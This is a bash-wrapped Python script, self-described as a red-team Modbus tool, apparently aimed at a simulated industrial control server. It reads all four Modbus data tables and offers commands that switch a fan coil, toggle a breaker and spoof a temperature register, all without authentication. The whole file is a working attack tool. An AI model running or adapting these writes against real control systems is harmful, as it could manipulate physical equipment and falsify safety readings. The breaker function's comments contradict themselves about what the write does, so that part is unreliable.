#!/usr/bin/env bash
# red_attack.sh - Self-contained Red Team Modbus Reconnaissance Tool
# Run directly with ./red_attack.sh or bash red_attack.sh

python3 - << 'EOF' "$@"
import sys
import argparse
import json
import time
from pymodbus.client import ModbusTcpClient

# Load register map to get dynamic addresses
try:
    with open('.register_map.json') as cfg_file:
        cfg = json.load(cfg_file)
    FAN_ADDR = cfg["FanAddr"]
    BREAKER_ADDR = cfg["BreakerAddr"]
    TEMP_ADDR = cfg["TempAddr"]
except Exception as e:
    # If not found locally, try parent directory
    try:
        with open('../.register_map.json') as cfg_file:
            cfg = json.load(cfg_file)
        FAN_ADDR = cfg["FanAddr"]
        BREAKER_ADDR = cfg["BreakerAddr"]
        TEMP_ADDR = cfg["TempAddr"]
    except Exception as ex:
        print(f"[-] Error loading register map: {ex}")
        sys.exit(1)

parser = argparse.ArgumentParser(description="Modbus Recon Tool with control options")
parser.add_argument("ip", nargs="?", default="127.0.0.1", help="Target IP address (default: 127.0.0.1)")
parser.add_argument("port", nargs="?", type=int, default=5020, help="Target port (default: 5020)")
parser.add_argument("--repeat", type=int, default=1, help="Number of scan repetitions (default: 1)")
parser.add_argument("--delay", type=float, default=3.0, help="Delay between repetitions in seconds (default: 3)")
parser.add_argument("--set-fan", type=int, choices=[0,1], help="Set fan coil state (0=off, 1=on)")
parser.add_argument("--set-breaker", type=int, choices=[0,1], help="Set breaker discrete (0=open, 1=closed)")
parser.add_argument("--spoof-temp", type=int, help="Spoof temperature holding register value (e.g. 0)")
args = parser.parse_args()

TARGET_IP = args.ip
PORT = args.port

# Helper functions for control actions
def write_fan(state):
    client = ModbusTcpClient(TARGET_IP, port=PORT)
    if not client.connect():
        print(f"[-] ERROR: Failed to connect to Modbus server at {TARGET_IP}:{PORT}")
        sys.exit(1)
    client.write_coil(FAN_ADDR, bool(state))
    client.close()
    print(f"[+] Fan coil at address {FAN_ADDR} set to {state}")

def write_breaker(state):
    client = ModbusTcpClient(TARGET_IP, port=PORT)
    if not client.connect():
        print(f"[-] ERROR: Failed to connect to Modbus server at {TARGET_IP}:{PORT}")
        sys.exit(1)
    # Breaker is a discrete input; we toggle the coil or write value.
    # Note: Breaker is usually a Discrete Input (read-only for Modbus),
    # but in our simulated server, we also monitor the discrete inputs datastore.
    # To write to a discrete input from outside, we write to the coil or address if writable,
    # but since FC02 is read-only, we should let user simulate it.
    # In our server simulation: disc_vals = context[0].getValues(2, breaker_addr, count=1)
    # Actually, Modbus TCP client can't write to discrete inputs (FC02) directly via standard Modbus write calls.
    # But context[0].setValues(2, breaker_addr, ...) is internal.
    # If client wants to write breaker state, let's write to coil (1) or holding (3) or write it to coil at breaker_addr
    # for simplicity. Let's write to coil address breaker_addr so our server reads it (or we can support writing coil).
    # In update_registers: disc_vals = context[0].getValues(2, breaker_addr, count=1)
    # Actually, in pymodbus client, we can write coil to change coils. Let's see if we should write coil.
    client.write_coil(BREAKER_ADDR, bool(state))
    client.close()
    print(f"[+] Breaker coil at address {BREAKER_ADDR} set to {state}")

def write_temp(value):
    client = ModbusTcpClient(TARGET_IP, port=PORT)
    if not client.connect():
        print(f"[-] ERROR: Failed to connect to Modbus server at {TARGET_IP}:{PORT}")
        sys.exit(1)
    # Write holding register override value
    client.write_register(TEMP_ADDR, value)
    client.close()
    print(f"[+] Temperature holding register at address {TEMP_ADDR} spoofed/set to {value}")

# Control mode handling
if args.set_fan is not None:
    write_fan(args.set_fan)
    sys.exit(0)
if args.set_breaker is not None:
    write_breaker(args.set_breaker)
    sys.exit(0)
if args.spoof_temp is not None:
    write_temp(args.spoof_temp)
    sys.exit(0)

def run_scan():
    client = ModbusTcpClient(TARGET_IP, port=PORT)
    if not client.connect():
        print(f"[-] ERROR: Failed to connect to Modbus server at {TARGET_IP}:{PORT}")
        sys.exit(1)
    print(f"[+] Connected to Modbus TCP server at {TARGET_IP}:{PORT}")

    for iteration in range(1, args.repeat + 1):
        print(f"\n=== Scan iteration {iteration}/{args.repeat} ===")
        
        # FC01 – Coils
        print("\n--- FC01: Coils ---")
        res = client.read_coils(0, count=100, slave=1)
        if not res.isError():
            for i, val in enumerate(res.bits[:100]):
                if val:
                    print(f"[FC01] Addr {i}: {val}")
        else:
            print(f"[-] FC01 Read Error: {res}")

        # FC02 – Discrete Inputs
        print("\n--- FC02: Discrete Inputs ---")
        res = client.read_discrete_inputs(0, count=100, slave=1)
        if not res.isError():
            for i, val in enumerate(res.bits[:100]):
                if val:
                    print(f"[FC02] Addr {i}: {val}")
        else:
            print(f"[-] FC02 Read Error: {res}")

        # FC03 – Holding Registers
        print("\n--- FC03: Holding Registers ---")
        res = client.read_holding_registers(0, count=100, slave=1)
        if not res.isError():
            for i, val in enumerate(res.registers):
                if val != 0:
                    print(f"[FC03] Addr {i}: {val}")
        else:
            print(f"[-] FC03 Read Error: {res}")

        # FC04 – Input Registers
        print("\n--- FC04: Input Registers ---")
        res = client.read_input_registers(0, count=100, slave=1)
        if not res.isError():
            for i, val in enumerate(res.registers):
                if val != 0:
                    print(f"[FC04] Addr {i}: {val}")
        else:
            print(f"[-] FC04 Read Error: {res}")

        if iteration < args.repeat:
            time.sleep(args.delay)

    client.close()
    print("\n[+] Scan Complete.")

if __name__ == "__main__":
    run_scan()
EOF